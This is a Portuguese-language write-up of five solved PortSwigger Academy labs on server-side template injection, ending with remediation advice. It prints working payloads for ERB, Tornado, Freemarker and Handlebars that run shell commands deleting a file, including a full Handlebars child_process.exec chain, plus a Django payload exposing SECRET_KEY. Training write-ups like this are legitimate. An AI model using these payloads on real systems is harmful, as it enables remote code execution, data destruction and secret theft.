---

# 📝 Server-Side Template Injection (SSTI)
## PortSwigger Web Security Academy — Practitioner Labs

---

## 📌 O que é a vulnerabilidade?
A **Injeção de Modelo Lado Servidor** acontece quando uma aplicação insere dados fornecidos pelo usuário diretamente no código de um modelo de renderização, sem higienização ou validação adequada. Isso permite que um invasor identifique o motor de modelo utilizado, execute código arbitrário no servidor e acesse dados sensíveis.

---

## 🧪 Laboratórios Resolvidos

### 1. Basic server-side template injection — ✅ Resolvido
**Motor:** ERB (Embedded Ruby)
**Cenário:** O parâmetro `message` é renderizado diretamente pelo template ERB.
**Passos:**
- Confirme a injeção com: `<%= 7*7 %>` → retorna `49`
- Execute comando no sistema: `<%= system("rm /home/carlos/morale.txt") %>`
**Impacto:** Execução arbitrária de comandos no servidor.

---

### 2. Basic server-side template injection (code context) — ✅ Resolvido
**Motor:** Tornado (Python)
**Cenário:** O valor de exibição do nome do autor é inserido dentro de uma expressão já existente no template.
**Passos:**
- Saia da expressão original: `user.name}}{{7*7}}`
- Execute comandos: `user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}`
- O comando só é executado ao carregar uma página que renderiza o nome do autor.
**Impacto:** Quebra de contexto e execução de código Python arbitrário.

---

### 3. Server-side template injection using documentation — ✅ Resolvido
**Motor:** Freemarker (Java)
**Cenário:** Edição de modelos de descrição de produtos permite inserir sintaxe do template.
**Passos:**
- Identifique o motor com `${foobar}` → erro confirma Freemarker
- Use o método `new()` para instanciar classe de execução:
  ```
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
  ```
**Impacto:** Acesso a classes perigosas do Java via documentação oficial.

---

### 4. Server-side template injection in an unknown language with a documented exploit — ✅ Resolvido
**Motor:** Handlebars (Node.js)
**Cenário:** Parâmetro `message` vulnerável; motor desconhecido inicialmente.
**Passos:**
- Identifique o motor por mensagens de erro de sintaxe
- Use exploit documentado da comunidade adaptado:
  ```handlebars
  wrtz{{#with "s" as |string|}}
  {{#with "e"}}
  {{#with split as |conslist|}}
  {{this.pop}}
  {{this.push (lookup string.sub "constructor")}}
  {{this.pop}}
  {{#with string.split as |codelist|}}
  {{this.pop}}
  {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
  {{this.pop}}
  {{#each conslist}}
  {{#with (string.sub.apply 0 codelist)}}
  {{this}}
  {{/with}}
  {{/each}}
  {{/with}}
  {{/with}}
  {{/with}}
  ```
- Codifique para URL e acesse para executar.
**Impacto:** Uso de exploits públicos para obter execução de código em motores desconhecidos.

---

### 5. Server-side template injection with information disclosure via user-supplied objects — ✅ Resolvido
**Motor:** Django Template Language
**Cenário:** Objetos do sistema são acessíveis dentro do template.
**Passos:**
- Identifique o motor com sintaxe inválida → erro confirma Django
- Liste objetos disponíveis: `{% debug %}`
- Acesse dado sensível: `{{settings.SECRET_KEY}}`
- Envie a chave obtida para resolver o laboratório.
**Impacto:** Vazamento de informações críticas do framework.

---

## 🛡️ Boas Práticas de Correção
- Nunca insira entrada do usuário diretamente no código do modelo
- Utilize mecanismos de escape automático
- Restrinja o que os modelos podem acessar e executar
- Use listas brancas de objetos e funções permitidas
- Atualize constantemente os motores de modelo

---

**Autor:** [Aislan]
**Plataforma:** PortSwigger Web Security Academy
**Nível:** Practitioner
**Status:** Todos os laboratórios da seção resolvidos ✅

---
